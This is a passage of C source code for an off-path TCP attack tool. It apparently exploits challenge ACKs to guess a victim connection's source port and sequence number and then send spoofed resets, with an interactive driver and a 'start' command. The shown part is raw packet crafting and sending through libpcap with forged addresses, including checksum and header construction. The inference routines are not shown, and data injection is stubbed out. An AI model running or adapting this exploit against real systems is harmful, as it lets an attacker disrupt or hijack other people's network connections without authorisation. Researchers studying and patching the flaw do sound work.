 * 6. profit?
 *
 */
int conduct_offpath_attack(void)
{
	pthread_t rth;

	/* generate the packet we'll send over and over to elicit challenge ACKs */
	if (!prepare_rst_packet(&g_rst_pkt))
		return 0;

	/* spawn the recv thread. it will live throughout the attack process... */
	if (pthread_create(&rth, NULL, recv_thread, NULL)) {
		fprintf(stderr, "[!] failed to start recv thread!\n");
		return 0;
	}

	/* if we have both a seq and a client port, just send an RST */
	if (g_ctx.spoof.src.sin_port && g_ctx.spoof.seq) {
		if (!tcp_send(g_ctx.pch, &(g_ctx.spoof), TH_RST, NULL, 0))
			return 0;
		return 0;
	}

	/* synchronize our processing with the remote host's clock */
	if (!sync_time_with_remote())
		return 0;

	/* figure out the target connection's source port number */
	if (!infer_four_tuple())
		return 0;

	/* figure out the target connection's sequence number */
	if (!infer_sequence_number())
		return 0;

#if 0
	// ack number?

	// inject some stuff?
#endif

	return 1;
}


/*
 * this function sets up the attack.
 *
 * it starts by opening a raw socket and starting to capture packets for the
 * legit connection.
 *
 * next, we execute a three-way handshake to get connected.
 *
 * finally, we loop for packets that we captured and do maintenance on the TCP
 * session as needed.
 *
 * special keys while in the data loop:
 * control-U         erase to beginning of line
 * control-[ (Esc)   closes connection and exits
 * "start\n"         launches the offpath attack (after connected)
 */
int set_up_attack(void)
{
	uint16_t lport = rand() & 0xffff;
	pcap_t *pch = NULL;
	struct pcap_pkthdr *pchdr = NULL;
	const u_char *inbuf = NULL;
	int pcret;
	char outbuf[8192];
	int outlen = 0;
	volatile conn_t *pconn;
	int ipoff;

	printf("[*] Selected local port: %u\n", lport);

	pconn = &g_ctx.legit;
	if (!start_pcap(&pch, &(pconn->dst), lport, &ipoff)) {
		pcap_perror(pch, "[!] Unable to start packet capture");
		return 1;
	}
	g_ctx.pch = pch;
	g_ctx.ipoff = ipoff;

	/* set the local port */
	pconn->src.sin_port = htons(lport);

	/* initialize the parts of the spoofed connection we know.. */
	tcp_init(&g_ctx.spoof, 0);

	/* make a legit connection to the server */
	tcp_init(pconn, rand());
	if (!tcp_send(pch, pconn, TH_SYN, NULL, 0))
		return 1;
	pconn->state = CS_SYN_SENT;

	while (pconn->state != CS_FINISHED) {
		pcret = pcap_next_ex(pch, &pchdr, &inbuf);
		if (pcret == 1) {
			u_char flags;
			uint32_t rack, rseq;
			void *data;
			size_t datalen;

			if (tcp_recv(pchdr, inbuf, &flags, &rack, &rseq, &data, &datalen)) {
				switch (pconn->state) {

					case CS_SYN_SENT:
						/* see if we got a SYN|ACK */
						if ((flags & TH_SYN) && (flags & TH_ACK)
								&& rack == pconn->seq + 1) {
							/* we need to ACK the seq */
							pconn->seq = rack;
							pconn->ack = rseq + 1;
							if (!tcp_send(pch, pconn, TH_ACK, NULL, 0))
								return 1;
							pconn->state = CS_CONNECTED;

							printf("[*] TCP handshake complete! Entering interactive session...\n");
							setterm(0);

							if (g_ctx.autostart) {
								usleep(500000);
								printf("[*] Commencing attack...\n");
								if (!conduct_offpath_attack())
									return 1;
							}
						}
						break;

					case CS_CONNECTED:
						if ((flags & TH_PUSH) && (flags & TH_ACK)
								&& rack == pconn->seq) {
							//printf("[*] PSH|ACK received (len %lu)\n", datalen);
						}

						/* they just ACK'd what we sent only... */
						else if (flags == TH_ACK && rack == pconn->seq) {
							//printf("[*] ACK received (len %lu)\n", datalen);
						}

						/* perhaps the remote said to shut down... */
						else if (flags & TH_FIN) {
							printf("[*] FIN received\n");
							pconn->ack++;
							if (!tcp_send(pch, pconn, TH_ACK, NULL, 0))
								return 1;
							if (!tcp_send(pch, pconn, TH_FIN, NULL, 0))
								return 1;
							pconn->state++;
						}

						else if (flags & TH_RST) {
							if (rseq == pconn->ack) {
								printf("[*] RST received\n");
								pconn->state++;
							}
							/* otherwise, drop the RST */
						}

						else
							printf("[*] Packet with unexpected flags (0x%x) received...\n",
									flags);

						/* see if we got data from remote... */
						if (datalen > 0) {
							ssize_t nw;

							nw = write(fileno(stdout), data, datalen);
							if (nw < 0)
								perror("[!] write to stdout failed");
							else if (datalen != (size_t)nw) {
								fprintf(stderr, "[!] short write!\n");
							}
							pconn->ack += datalen;
							if (!tcp_send(pch, pconn, TH_ACK, NULL, 0))
								return 1;
						}

						break;

					default:
						printf("unknown state??\n");
						break;
				}
			}
		}

		/* packet read failure? */
		if (pcret < 0)
			break;

		/* check for keyboard input */
		while (kbhit() == 1) {
			int ch = getchar();

			switch (ch)
			{
				case 0xa: // LF
				case 0xd: // CR
					outbuf[outlen++] = '\n';

					/* start the attack now! */
					if (strncmp(outbuf, "start\n", 6) == 0) {
						if (!conduct_offpath_attack())
							return 1;
					} else {
						if (!tcp_send(pch, pconn, TH_PUSH|TH_ACK, outbuf, outlen))
							return 1;
						pconn->seq += outlen;
					}
					outlen = 0;
					break;

				case 0x15: // ^U (NAK)
					{
						ssize_t nw;
						static const char *clearline = "\r\033[K";

						nw = write(fileno(stdout), clearline, sizeof(clearline) - 1);
						if (nw < 0)
							perror("[!] write to stdout failed");
						else if (nw != sizeof(clearline) - 1) {
							fprintf(stderr, "[!] short write!\n");
						}
					}
					outlen = 0;
					break;

				case 0x1b: // ^[ (ESC)
					printf("[*] Connection closed.\n");
					if (!tcp_send(pch, pconn, TH_FIN, NULL, 0))
						return 1;
					pconn->seq++;
					sleep(1);
					if (!tcp_send(pch, pconn, TH_ACK, NULL, 0))
						return 1;
					pconn->state = CS_FINISHED;
					break;

				default:
					outbuf[outlen++] = ch;
					break;
			}
		}
	}

	setterm(1);
	pcap_close(pch);
	return 0;
}


/*
 * initialize a connection structure from the parameters
 */
void tcp_init(volatile conn_t *pconn, uint32_t seq)
{
	pconn->id = rand() % 0xffff;
	pconn->state = CS_NEW;
	if (!pconn->seq)
		pconn->seq = seq;
}


/*
 * ripped from ping.c, it calulates the checksum of len bytes at addr and
 * returns it.
 */
uint16_t in_cksum(uint16_t *addr, size_t len)
{
	register int nleft = len;
	register uint16_t *w = addr;
	register int sum = 0;
	uint16_t answer = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return answer;
}
/* end ping ripped */


/*
 * craft a TCP packet based on the given parameters
 *
 * this is based on Matt Barrie's old non-working TCPseqnumpred.c
 * the problem with that program was not this function however..
 */
int tcp_craft(void *output, size_t *outlen, volatile conn_t *pconn, u_char flags, char *data, size_t len)
{
	struct ip ip;
	struct tcphdr tcp;
	char tcpbuf[4096], *ptr;
	uint16_t size;

	/* buffer too small? */
	if (*outlen < sizeof(ip) + sizeof(tcp) + len) {
		fprintf(stderr, "tcp_craft: buffer too small!!\n");
		return 0;
	}

	/* construct the IP header */
	ip.ip_hl = sizeof(ip) / 4;
	ip.ip_v = 4;
	ip.ip_tos = 0;
	ip.ip_len = htons(sizeof(ip) + sizeof(tcp) + len);
	ip.ip_id = htons(pconn->id);
	pconn->id++;
	ip.ip_off = 0;
	ip.ip_ttl = 255;
	ip.ip_p = IPPROTO_TCP;
	ip.ip_sum = 0;
	ip.ip_src.s_addr = pconn->src.sin_addr.s_addr;
	ip.ip_dst.s_addr = pconn->dst.sin_addr.s_addr;

	/* calculate the IP checksum */
	ip.ip_sum = in_cksum((uint16_t *)&ip, sizeof(ip));

	/* construct the TCP header */
	tcp.th_sport = pconn->src.sin_port;
	tcp.th_dport = pconn->dst.sin_port;
	tcp.th_seq = htonl(pconn->seq);
	tcp.th_ack = htonl(pconn->ack);
	tcp.th_x2 = 0;
	tcp.th_off = 5;
	tcp.th_flags = flags;
	tcp.th_win = htons(10052);
	tcp.th_sum = 0;
	tcp.th_urp = 0;

	/* calculate the TCP checksum */
	ptr = tcpbuf;
	memset(tcpbuf, 0, sizeof(tcpbuf));
	memcpy(ptr, &(ip.ip_src.s_addr), 8);
	ptr += 9;
	*ptr++ = ip.ip_p;
	size = htons(len + sizeof(tcp));
	memcpy(ptr, &size, 2);
	ptr += 2;
	memcpy(ptr, &tcp, sizeof(tcp));
	ptr += sizeof(tcp);
	memcpy(ptr, data, len);
	tcp.th_sum = in_cksum((uint16_t *)tcpbuf, sizeof(tcp) + 12 + len);

	/* build the final packet */
	ptr = output;
	memcpy(ptr, &ip, sizeof(ip));
	ptr += sizeof(ip);
	memcpy(ptr, &tcp, sizeof(tcp));
	ptr += sizeof(tcp);
	memcpy(ptr, data, len);

	*outlen = (void *)ptr + len - output;

#ifdef DEBUG_SEQ
	{
		char shost[32], dhost[32];

		strcpy(shost, inet_ntoa(pconn->src.sin_addr));
		strcpy(dhost, inet_ntoa(pconn->dst.sin_addr));
		printf("[*] %s : %s:%d --> %s:%d : %s : seq %lu, ack %lu (len %lu)\n",
				g_conn_states[pconn->state],
				shost, ntohs(tcp.th_sport),
				dhost, ntohs(tcp.th_dport),
				tcp_flags(tcp.th_flags), (u_long)pconn->seq,
				(u_long)pconn->ack, (u_long)len);
	}
#endif

	return 1;
}


/*
 * craft and send a packet using libpcap
 */
int tcp_send(pcap_t *pch, volatile conn_t *pconn, u_char flags, char *data, size_t len)
{
	char packet[8192];
	size_t pktlen = sizeof(packet) - g_ctx.ipoff;

	memcpy(packet, ROUTER_MAC LOCAL_MAC "\x08\x00", g_ctx.ipoff);
	if (!tcp_craft(packet + g_ctx.ipoff, &pktlen, pconn, flags, data, len))
		return 0;
	pktlen += g_ctx.ipoff;

	if (pcap_sendpacket(pch, (void *)packet, pktlen) == -1) {
		fprintf(stderr, "[!] pcap_sendpacket failed!\n");
		return 0;
	}

	/* success!! */
	return 1;
}


/*
 * process the packet captured by libpcap. if everything goes well, we return
 * the TCP flags, ack, seq, and data (w/len) to the caller.
 */
int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags, uint32_t *pack, uint32_t *pseq, void **pdata, size_t *plen)
{
	struct ip *pip;
	struct tcphdr *ptcp;
	void *ptr;
	size_t iplen, tcplen, datalen;

	if (pph->caplen < g_ctx.ipoff + sizeof(struct ip)) {
		fprintf(stderr, "[!] tcp_recv: too short to be an IP packet!\n");
		return 0;
	}
	ptr = (void *)inbuf + g_ctx.ipoff;
	pip = (struct ip *)ptr;
	iplen = pip->ip_hl * 4;
	if (pph->caplen < g_ctx.ipoff + iplen) {
		fprintf(stderr, "[!] tcp_recv: too short to be an IP packet (w/options)!\n");
		return 0;
	}
	ptr += iplen;
	if (pph->caplen < g_ctx.ipoff + iplen + sizeof(struct tcphdr)) {
		fprintf(stderr, "[!] tcp_recv: too short to be a TCP packet!\n");
		return 0;
	}
	ptcp = (struct tcphdr *)ptr;
	if (!g_ctx.winsz) {
		g_ctx.winsz = ntohs(ptcp->th_win);
		printf("[*] TCP Window size: %u\n", g_ctx.winsz);
	}
	tcplen = ptcp->th_off * 4;
	ptr += tcplen;
	if (pph->caplen < g_ctx.ipoff + iplen + tcplen) {
		fprintf(stderr, "[!] tcp_recv: too short to be a TCP packet (w/options)!\n");
		return 0;
	}
	datalen = ntohs(pip->ip_len);
	if (iplen + tcplen > datalen) {
		fprintf(stderr, "[!] tcp_recv: IP.IP_LEN too small!\n");
		return 0;
	}
	datalen -= (iplen + tcplen);

#ifdef DEBUG_SEQ
	{
		char shost[32], dhost[32];

		strcpy(shost, inet_ntoa(pip->ip_src));
		strcpy(dhost, inet_ntoa(pip->ip_dst));
		/*
		printf("inbuf %p, ptcp %p, ptctp+1 %p, caplen %lu\n", inbuf, ptcp,
				ptcp+1, (uint32_t)pph->caplen);
		 */
		printf("[*] %s : %s:%d <-- %s:%d : %s : seq %lu, ack %lu (len %lu)\n",
				g_conn_states[g_ctx.legit.state],
				dhost, ntohs(ptcp->th_dport),
				shost, ntohs(ptcp->th_sport),
				tcp_flags(ptcp->th_flags),
				(u_long)ntohl(ptcp->th_seq), (u_long)ntohl(ptcp->th_ack),
				datalen);
	}
#endif


	/* save the output parameters and return */
	if (flags)
		*flags = ptcp->th_flags;
	if (pack)
		*pack = ntohl((uint32_t)ptcp->th_ack);
	if (pseq)
		*pseq = ntohl((uint32_t)ptcp->th_seq);
	if (pdata) {
		if (datalen > 0)
			*pdata = ptr;
		else
			*pdata = NULL;
	}
	if (plen)
		*plen = datalen;

	return 1;
}


/*
 * return a string showing which flags are set in the TCP packet
 *
 * netinet/tcp.h:# define TH_FIN      0x01
 * netinet/tcp.h:# define TH_SYN      0x02
 * netinet/tcp.h:# define TH_RST      0x04
 * netinet/tcp.h:# define TH_PUSH     0x08
 * netinet/tcp.h:# define TH_ACK      0x10
 * netinet/tcp.h:# define TH_URG      0x20
 */
char *tcp_flags(u_char flags)
{
	static char str[16];
	char *ptr = str;

	if (flags & TH_FIN)
		*ptr++ = 'F';
	if (flags & TH_SYN)
		*ptr++ = 'S';
	if (flags & TH_RST)
		*ptr++ = 'R';
	if (flags & TH_PUSH)
		*ptr++ = 'P';
	if (flags & TH_ACK)
		*ptr++ = 'A';
	if (flags & TH_URG)
		*ptr++ = 'U';
	*ptr++ = '\0';
	return str;
}


/*
 * prym wrote this stuff for me a long time ago, i thank him for it..
 * i modded it to make it portable (i hope)
 *
 * this function will set the terminal to ICANON (canonical mode). this
 * disables line buffering processing special characters (such as EOF, EOL,
 * WERASE etc).
 */
void setterm(int mode)
{
	static struct termios tmp, old;
	static int old_set = 0;

	if (mode == 0) {
		tcgetattr(fileno(stdin), &tmp);
		memcpy(&old, &tmp, sizeof(struct termios));
		tmp.c_lflag &= ~ICANON;
		tcsetattr(fileno(stdin), TCSANOW, &tmp);
		old_set = 1;
	} else if (old_set) {
		tcsetattr(fileno(stdin), TCSANOW, &old);
	}
}

/*
 * this function select(2)s stdin and returns 1 if there are characters in the
 * input buffer within the alotted time.
 * otherwise it returns 0 (what select(2) returns)
 */
int kbhit(void)
{
	fd_set rfds;
	struct timeval tv;

	FD_ZERO(&rfds);
	FD_SET(fileno(stdin), &rfds);
	tv.tv_sec = 0;
	tv.tv_usec = 25000;

	return select(fileno(stdin) + 1, &rfds, NULL, NULL, &tv);
}
/* thanks again prym */
